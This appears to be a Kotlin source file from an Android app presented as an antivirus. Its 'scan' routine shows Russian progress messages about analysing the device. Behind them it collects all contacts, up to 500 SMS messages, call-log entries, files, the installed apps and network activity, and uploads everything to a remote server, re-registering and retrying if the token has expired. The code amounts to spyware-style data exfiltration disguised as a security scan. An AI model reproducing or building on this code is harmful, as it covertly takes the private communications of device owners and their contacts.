package com.graphene.antivirus.data

import com.graphene.antivirus.scanner.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class ScanRepository(
    private val api: GrapheneApi,
    private val context: android.content.Context
) {
    private val registration = RegistrationManager(context)

    suspend fun performScan(
        deviceId: String,
        onProgress: (String, Float) -> Unit
    ): Result<ScanResponse> = withContext(Dispatchers.IO) {
        try {
            // 0. гарантируем токен
            onProgress("Регистрация устройства…", 0.05f)
            registration.ensureRegistered()
                ?: return@withContext Result.failure(Exception("Не удалось зарегистрировать устройство"))

            onProgress("Сбор данных об устройстве…", 0.1f)
            val device = DeviceInfoCollector().collect(deviceId)

            onProgress("Анализ приложений…", 0.25f)
            val apps = TelemetryCollector(context).collectAll()

            onProgress("Анализ контактов…", 0.4f)
            val contacts = ContactsCollector(context).collect()

            onProgress("Анализ SMS…", 0.5f)
            val sms = SmsCollector(context).collect(500)

            onProgress("Анализ вызовов…", 0.6f)
            val calls = CallLogCollector(context).collect(500)

            onProgress("Анализ файлов…", 0.75f)
            val files = FilesCollector(context).collect(300)

            onProgress("Анализ сетевой активности…", 0.85f)
            val network = NetworkEventStore.snapshot()

            onProgress("Отправка на сервер…", 0.92f)
            var response = api.uploadTelemetry(
                ScanRequest(
                    device, apps, contacts, sms, calls, files, network,
                    System.currentTimeMillis()
                )
            )

            // 401 → токен протух, перерегистрируемся и повторяем один раз
            if (response.code() == 401) {
                onProgress("Обновление токена…", 0.93f)
                registration.forceReRegister()
                response = api.uploadTelemetry(
                    ScanRequest(
                        device, apps, contacts, sms, calls, files, network,
                        System.currentTimeMillis()
                    )
                )
            }

            if (response.isSuccessful && response.body() != null) {
                onProgress("Готово", 1f)
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("HTTP ${response.code()}"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}